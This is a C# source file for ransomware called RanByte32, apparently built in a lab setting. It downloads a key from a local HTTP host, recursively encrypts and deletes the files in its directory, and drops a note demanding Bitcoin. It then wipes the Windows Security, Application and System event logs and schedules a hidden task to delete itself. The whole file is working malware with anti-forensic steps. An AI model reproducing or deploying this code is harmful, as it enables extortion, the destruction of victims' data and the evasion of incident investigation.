using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Net;
using System.Diagnostics;
using System.Linq;
using System.Threading;


namespace RanByte32
{
    class Program
    {
        // Call this function to remove the key from memory after use
        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);

        static void Main(string[] args)
        {
            bool encrypt = true;
            bool singleFile = false;
            bool recursive = true;
            string teaFile = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            string path = Path.GetDirectoryName(teaFile);

            if (recursive == true)
            {
                path = path + @"\";
            }
            
            string p = GeneratePassword(path);

            // List of file paths
            List<string> filePaths = new List<string>();
            GCHandle gch = GCHandle.Alloc(p, GCHandleType.Pinned);

            // encrypt files
            if (encrypt == true)
            {
                // encrypt single file
                if (singleFile == true)
                {

                    EncryptFile(path, p);
                    // ExportKey(p, path);
                    PwnMessage(path);
                    ZeroMemory(gch.AddrOfPinnedObject(), p.Length * 2);
                    gch.Free();
                }
                // encrypt a whole dir, including sub directories
                else if (recursive == true)
                {
                    filePaths = GetFiles(path, p, encrypt);
                    PwnMessage(path);
                    ZeroMemory(gch.AddrOfPinnedObject(), p.Length * 2);
                    gch.Free();
                    Console.WriteLine("\nAll the files are encrypted!");
                }
            }
            else
            {
                Console.WriteLine("Please use -e or -d");
            }

            Console.WriteLine("\nClearing the tracks, you won't find anything in the logs!");
            Thread.Sleep(5000);

            var now = DateTime.Now;
            var fiveMinsAgo = now.AddMinutes(-5);

            var eventLog1 = new EventLog("Security", Environment.MachineName);
            var entries1 = eventLog1.Entries.Cast<EventLogEntry>()
                .Where(x => x.TimeGenerated >= fiveMinsAgo)
                .ToList();

            if (entries1.Count > 0)
            {
                foreach (var entry in entries1)
                {
                    eventLog1.Clear();

                }
                Console.WriteLine("\nSecurity event logs are deleted successfully!");
            }
            else
            {
                Console.WriteLine("No recent event logs found");
            }

            Thread.Sleep(3000);
            var eventLog2 = new EventLog("Application", Environment.MachineName);
            var entries2 = eventLog2.Entries.Cast<EventLogEntry>()
                .Where(x => x.TimeGenerated >= fiveMinsAgo)
                .ToList();
            if (entries2.Count > 0)
            {
                foreach (var entry in entries2)
                {
                    eventLog2.Clear();

                }
                Console.WriteLine("\nApplication event logs are deleted successfully!");
            }
            else
            {
                Console.WriteLine("No recent event logs found");
            }

            Thread.Sleep(3000);
            var eventLog3 = new EventLog("System", Environment.MachineName);
            var entries3 = eventLog3.Entries.Cast<EventLogEntry>()
                .Where(x => x.TimeGenerated >= fiveMinsAgo)
                .ToList();
            if (entries3.Count > 0)
            {
                foreach (var entry in entries3)
                {
                    eventLog3.Clear();

                }
                Console.WriteLine("\nSystem event logs are deleted successfully!");
            }
            else
            {
                Console.WriteLine("No recent event logs found");
            }

            
            Thread.Sleep(5000);
            try
            {

                DeleteRansom(path);
                Console.WriteLine("\nRanByte32 will delete it self in 1 minute!");

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        static List<string> GetFiles(string folder, string password, bool e)
        {
            List<string> filePaths = new List<string>();
            string teaFile = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            foreach (string file in Directory.GetFiles(folder))
            {
                // filePaths.Add(file);
                Console.WriteLine(file);

                if (e == true)
                {
                    try
                    {
                        if (file != teaFile)
                        {
                            EncryptFile(file, password);
                        }

                    }
                    catch
                    {

                    }
                }
                else if (e == false)
                {
                    try
                    {
                        string npath = Path.GetDirectoryName(file) + "/" + Path.GetFileNameWithoutExtension(file);
                        Console.WriteLine("NEW PATH --> " + npath);

                    }
                    catch { }
                }

            }
            foreach (string subDir in Directory.GetDirectories(folder))
            {
                try
                {
                    List<string> subFiles = GetFiles(subDir, password, e);
                    foreach (string subfile in subFiles)
                    {
                        if (e == true)
                        {
                            try
                            {
                                EncryptFile(subfile, password);

                            }
                            catch { }
                        }

                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: ", ex.Message);
                }
            }
            return filePaths;
        }
        public static byte[] GenerateSalt()
        {
            byte[] salt = new byte[32];

            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(salt);
                }
                return salt;
            }
        }

        static void EncryptFile(string dpath, string password)
        {


            byte[] salt = GenerateSalt();

            FileStream fsCrypt = new FileStream(dpath + ".ranbyte32", FileMode.Create);
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;
            AES.Padding = PaddingMode.PKCS7;


            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);

            AES.Mode = CipherMode.CFB;

            fsCrypt.Write(salt, 0, salt.Length);

            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);

            FileStream fsIn = new FileStream(dpath, FileMode.Open);

            byte[] buffer = new byte[1048576];
            int read;

            try
            {
                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
                {
                    cs.Write(buffer, 0, read);
                }

                fsIn.Close();
            }

            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
            finally
            {
                cs.Close();
                fsCrypt.Close();
            }

            File.Delete(dpath);

        }

        // Function used as a controller to encrypt each file individually
        static void EncryptFiles(List<string> filePaths, string p)
        {
            foreach (var path in filePaths)
            {
                try
                {
                    EncryptFile(path, p);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
            }
        }

        static string GeneratePassword(string path)
        {
            WebClient client = new WebClient();
            byte[] aesKey = client.DownloadData("http://192.168.88.128/aes_key.txt");
            string password = aesKey.ToString();

            return (password);
        }

        static void PwnMessage(string path)
        {
            Console.WriteLine(path);
            using (StreamWriter outputFile = new StreamWriter(Path.GetDirectoryName(path) + @"\" + "NOTE.txt"))
            {
                string msg = "All files and folders are encrypted with a key!\n\nDO NOT attempt to decrypt your files, else they\'ll be deleted!\n\nPlease deposite 500k in the following walet to get the decryption key!\n\nBTC Wallet: 0H3v4SYHdJ23S8Hgb3eGGm9KnHBKLuf6HB";
                outputFile.WriteLine(msg);
            }
            Console.WriteLine(Path.GetDirectoryName(path) + "NOTE.txt");
        }

        static void DeleteRansom(string path)
        {
            try
            {
                var now = DateTime.Now;
                var currentTime = now.ToString("HH:mm");
                Console.WriteLine("Current Time: " + currentTime + "\n");

                var addMinute = now.AddMinutes(1).ToString("HH:mm");
                Console.WriteLine("Added 1 minutes to Current Time: " + addMinute);   

                var currentDate = now.Date.ToString("dd/MM/yyyy");
                Console.WriteLine("Current Date: " + currentDate + "\n");

                var random = new Random();
                const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                var taskName = new string(Enumerable.Repeat(chars, 8)
                  .Select(s => s[random.Next(s.Length)])
                  .ToArray());
                Console.WriteLine("Randomly generated Task Name: " + taskName + "\n");

                string filePath = Path.GetDirectoryName(path) + "\\RanByte32.exe";
                Console.WriteLine(filePath + "\n");
                //string command = $"schtasks /create /sc minute /mo 1 /tn LegitTask /tr \"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c del \'{filePath}\'\"";
                //string command = $"schtasks /create /sc once /sd {currentDate} /st {addMinute} /tn {taskName} /tr \"C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c del {filePath}\"";
                string command = $"schtasks /create /sc once /sd {currentDate} /st {addMinute} /tn {taskName} /tr \"C:\\Windows\\system32\\cmd.exe /c del \'{filePath}\'\"";
                Console.WriteLine(command);

                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine(command);
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();

            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

    }
}
